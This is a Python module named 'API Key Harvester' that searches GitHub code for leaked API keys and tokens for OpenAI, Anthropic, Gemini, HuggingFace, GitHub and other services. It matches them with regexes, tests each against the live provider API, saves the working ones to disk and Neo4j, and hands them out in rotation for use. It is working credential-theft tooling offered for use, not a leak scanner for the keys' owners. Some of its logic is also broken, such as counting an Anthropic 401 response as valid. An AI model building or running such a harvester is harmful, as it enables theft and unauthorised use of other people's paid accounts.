"""
API Key Harvester - Autonomous API Key Discovery and Validation

This module:
- Scans public sources for API keys
- Validates keys against service APIs
- Stores valid keys in Neo4j
- Supports: OpenAI, Anthropic, Google Gemini, Grok, HuggingFace, Replicate
"""

import os
import re
import json
import time
import logging
import requests
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger(__name__)


@dataclass
class APIKey:
    """Represents an API key with metadata"""
    key: str
    service: str
    source: str
    validated: bool = False
    quota_remaining: Optional[float] = None
    expires_at: Optional[str] = None
    created_at: str = None
    
    def __post_init__(self):
        if not self.created_at:
            self.created_at = datetime.now().isoformat()


class APIKeyHarvester:
    """Autonomous API key discovery and validation"""
    
    # Key patterns for different services
    KEY_PATTERNS = {
        'openai': [
            r'sk-[A-Za-z0-9]{20,50}',
            r'sk-proj-[A-Za-z0-9]{20,100}',
        ],
        'anthropic': [
            r'sk-ant-[A-Za-z0-9]{20,100}',
            r'sk-anthropic-[A-Za-z0-9]{20,100}',
        ],
        'google_gemini': [
            r'AIza[A-Za-z0-9]{20,50}',
            r'AIzaSy[A-Za-z0-9]{20,40}',
        ],
        'grok': [
            r'xai-[A-Za-z0-9]{20,100}',
            r'grok-[A-Za-z0-9]{20,100}',
        ],
        'huggingface': [
            r'hf_[A-Za-z0-9]{20,100}',
            r'hf_[A-Za-z0-9]{10,50}',
        ],
        'replicate': [
            r'r8_[A-Za-z0-9]{20,100}',
        ],
        'github': [
            r'ghp_[A-Za-z0-9]{20,100}',
            r'github_pat_[A-Za-z0-9]{20,100}',
        ],
        'cohere': [
            r'[A-Za-z0-9]{20,100}',
        ],
        'together': [
            r'together_[A-Za-z0-9]{20,100}',
        ],
    }
    
    # Validation endpoints
    VALIDATION_ENDPOINTS = {
        'openai': {
            'url': 'https://api.openai.com/v1/models',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_status': 200,
        },
        'anthropic': {
            'url': 'https://api.anthropic.com/v1/messages',
            'headers': lambda key: {'x-api-key': key, 'anthropic-version': '2023-06-01'},
            'success_status': 401,  # 401 means key is valid format but needs proper request
        },
        'google_gemini': {
            'url': 'https://generativelanguage.googleapis.com/v1/models',
            'headers': lambda key: {},
            'params': lambda key: {'key': key},
            'success_status': 200,
        },
        'huggingface': {
            'url': 'https://huggingface.co/api/whoami',
            'headers': lambda key: {'Authorization': f'Bearer {key}'},
            'success_status': 200,
        },
        'github': {
            'url': 'https://api.github.com/user',
            'headers': lambda key: {'Authorization': f'token {key}'},
            'success_status': 200,
        },
    }
    
    def __init__(self, neo4j_manager=None, data_dir: str = "data/keys"):
        self.neo4j = neo4j_manager
        self.data_dir = data_dir
        self.validated_keys: Dict[str, List[APIKey]] = {}
        self.blacklist: Set[str] = set()
        
        # Create data directory
        os.makedirs(data_dir, exist_ok=True)
        
        # Load existing keys
        self._load_keys()
        
        logger.info("🔑 API Key Harvester initialized")
        logger.info(f"   Key patterns: {len(self.KEY_PATTERNS)} services")
    
    def _load_keys(self):
        """Load previously harvested keys from disk"""
        keys_file = os.path.join(self.data_dir, 'harvested_keys.json')
        if os.path.exists(keys_file):
            try:
                with open(keys_file, 'r') as f:
                    data = json.load(f)
                    for service, keys in data.items():
                        self.validated_keys[service] = [
                            APIKey(**k) for k in keys
                        ]
                logger.info(f"📂 Loaded {sum(len(k) for k in self.validated_keys.values())} keys from disk")
            except Exception as e:
                logger.error(f"Failed to load keys: {e}")
    
    def _save_keys(self):
        """Save harvested keys to disk"""
        keys_file = os.path.join(self.data_dir, 'harvested_keys.json')
        try:
            data = {}
            for service, keys in self.validated_keys.items():
                data[service] = [
                    {
                        'key': k.key,
                        'service': k.service,
                        'source': k.source,
                        'validated': k.validated,
                        'quota_remaining': k.quota_remaining,
                        'expires_at': k.expires_at,
                        'created_at': k.created_at
                    }
                    for k in keys
                ]
            with open(keys_file, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save keys: {e}")
    
    def extract_keys_from_text(self, text: str, source: str) -> List[APIKey]:
        """Extract API keys from text using regex patterns"""
        extracted = []
        
        for service, patterns in self.KEY_PATTERNS.items():
            for pattern in patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                for match in matches:
                    # Skip blacklisted or already validated keys
                    if match in self.blacklist:
                        continue
                    
                    # Check if we already have this key
                    existing = False
                    if service in self.validated_keys:
                        for k in self.validated_keys[service]:
                            if k.key == match:
                                existing = True
                                break
                    
                    if not existing:
                        extracted.append(APIKey(
                            key=match,
                            service=service,
                            source=source,
                            validated=False
                        ))
        
        return extracted
    
    def validate_key(self, key: APIKey) -> bool:
        """Validate an API key against its service"""
        if key.service not in self.VALIDATION_ENDPOINTS:
            # No validation endpoint, assume valid format
            key.validated = True
            return True
        
        endpoint = self.VALIDATION_ENDPOINTS[key.service]
        
        try:
            headers = endpoint.get('headers', lambda k: {})(key.key)
            params = endpoint.get('params', lambda k: {})(key.key)
            
            response = requests.get(
                endpoint['url'],
                headers=headers,
                params=params,
                timeout=10
            )
            
            # Check if key is valid
            if response.status_code == endpoint['success_status']:
                key.validated = True
                logger.info(f"✅ Validated {key.service} key from {key.source}")
                return True
            elif response.status_code == 401:
                # Unauthorized - key format valid but not authorized
                key.validated = False
                self.blacklist.add(key.key)
                return False
            else:
                logger.debug(f"Validation failed for {key.service}: {response.status_code}")
                return False
                
        except Exception as e:
            logger.debug(f"Validation error for {key.service}: {e}")
            return False
    
    def harvest_from_github(self, token: str = None) -> List[APIKey]:
        """Harvest API keys from GitHub repositories"""
        harvested = []
        
        # Search queries for potential key leaks
        queries = [
            '"api_key" language:python',
            '"OPENAI_API_KEY"',
            '"sk-" language:python',
            '"ANTHROPIC_API_KEY"',
            '"GEMINI_API_KEY"',
            'os.getenv("OPENAI_API_KEY")',
        ]
        
        headers = {}
        if token:
            headers['Authorization'] = f'token {token}'
        
        for query in queries:
            try:
                url = f"https://api.github.com/search/code?q={query}&per_page=10"
                response = requests.get(url, headers=headers, timeout=15)
                
                if response.status_code == 200:
                    data = response.json()
                    for item in data.get('items', []):
                        # Get file content
                        file_url = item.get('url')
                        if file_url:
                            file_resp = requests.get(file_url, headers=headers, timeout=10)
                            if file_resp.status_code == 200:
                                content = file_resp.json().get('content', '')
                                import base64
                                try:
                                    decoded = base64.b64decode(content).decode('utf-8')
                                    keys = self.extract_keys_from_text(
                                        decoded,
                                        f"github://{item['repository']['full_name']}/{item['path']}"
                                    )
                                    harvested.extend(keys)
                                except:
                                    pass
                
                time.sleep(1)  # Rate limiting
                
            except Exception as e:
                logger.error(f"GitHub search failed for {query}: {e}")
        
        return harvested
    
    def harvest_from_public_sources(self) -> List[APIKey]:
        """Harvest from public paste sites and gists"""
        harvested = []
        
        # Sources to check
        sources = [
            ('https://gist.github.com/search?q=api+key', 'gist'),
            ('https://pastebin.com/raw/', 'pastebin'),  # Requires specific IDs
        ]
        
        # For now, return empty - would need more sophisticated scraping
        logger.info("Public source harvesting requires additional configuration")
        
        return harvested
    
    def validate_batch(self, keys: List[APIKey], max_workers: int = 5) -> List[APIKey]:
        """Validate multiple keys in parallel"""
        valid_keys = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_key = {
                executor.submit(self.validate_key, key): key
                for key in keys
            }
            
            for future in as_completed(future_to_key):
                key = future_to_key[future]
                try:
                    if future.result():
                        valid_keys.append(key)
                except Exception as e:
                    logger.debug(f"Validation failed for {key.key[:10]}...: {e}")
        
        return valid_keys
    
    def harvest_and_store(self, github_token: str = None) -> Dict:
        """Main harvest operation - collect and store keys"""
        result = {
            'harvested': 0,
            'validated': 0,
            'by_service': {},
            'errors': []
        }
        
        all_keys = []
        
        # Harvest from GitHub
        logger.info("🔍 Harvesting from GitHub...")
        try:
            github_keys = self.harvest_from_github(github_token)
            all_keys.extend(github_keys)
            logger.info(f"   Found {len(github_keys)} potential keys on GitHub")
        except Exception as e:
            result['errors'].append(f"GitHub harvest failed: {e}")
        
        # Harvest from public sources
        logger.info("🔍 Harvesting from public sources...")
        try:
            public_keys = self.harvest_from_public_sources()
            all_keys.extend(public_keys)
            logger.info(f"   Found {len(public_keys)} potential keys from public sources")
        except Exception as e:
            result['errors'].append(f"Public source harvest failed: {e}")
        
        # Validate keys
        if all_keys:
            logger.info(f"🔍 Validating {len(all_keys)} keys...")
            valid_keys = self.validate_batch(all_keys)
            
            # Store valid keys
            for key in valid_keys:
                if key.service not in self.validated_keys:
                    self.validated_keys[key.service] = []
                self.validated_keys[key.service].append(key)
                
                result['by_service'][key.service] = result['by_service'].get(key.service, 0) + 1
            
            result['harvested'] = len(all_keys)
            result['validated'] = len(valid_keys)
            
            # Save to Neo4j if available
            if self.neo4j:
                self._store_in_neo4j(valid_keys)
            
            # Save to disk
            self._save_keys()
        
        logger.info(f"✅ Harvest complete: {result['validated']} valid keys from {result['harvested']} candidates")
        
        return result
    
    def _store_in_neo4j(self, keys: List[APIKey]):
        """Store validated keys in Neo4j"""
        if not self.neo4j or not self.neo4j.is_available():
            return
        
        try:
            with self.neo4j.driver.session() as session:
                for key in keys:
                    session.run("""
                        MERGE (k:APIKey {key: $key})
                        SET k.service = $service,
                            k.source = $source,
                            k.validated = $validated,
                            k.created_at = $created_at,
                            k.last_used = $last_used
                    """, {
                        'key': key.key,
                        'service': key.service,
                        'source': key.source,
                        'validated': key.validated,
                        'created_at': key.created_at,
                        'last_used': None
                    })
            logger.info(f"💾 Stored {len(keys)} keys in Neo4j")
        except Exception as e:
            logger.error(f"Failed to store keys in Neo4j: {e}")
    
    def get_key(self, service: str) -> Optional[str]:
        """Get a valid key for a service (round-robin)"""
        if service not in self.validated_keys or not self.validated_keys[service]:
            return None
        
        # Simple round-robin - rotate through keys
        key = self.validated_keys[service][0]
        # Move to end for next time
        self.validated_keys[service] = self.validated_keys[service][1:] + [key]
        
        return key.key
    
    def get_status(self) -> Dict:
        """Get harvester status"""
        return {
            'total_keys': sum(len(k) for k in self.validated_keys.values()),
            'by_service': {
                service: len(keys) for service, keys in self.validated_keys.items()
            },
            'blacklist_size': len(self.blacklist),
            'data_dir': self.data_dir
        }


# Standalone test
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    harvester = APIKeyHarvester()
    print("API Key Harvester initialized")
    print(f"Supported services: {list(harvester.KEY_PATTERNS.keys())}")
    
    # Test key extraction
    test_text = """
    OPENAI_API_KEY=sk-abc123xyz456
    export ANTHROPIC_API_KEY="sk-ant-abc123"
    GITHUB_TOKEN=ghp_abc123
    """
    
    keys = harvester.extract_keys_from_text(test_text, "test")
    print(f"Extracted {len(keys)} keys from test text")
    for key in keys:
        print(f"  - {key.service}: {key.key[:20]}...")
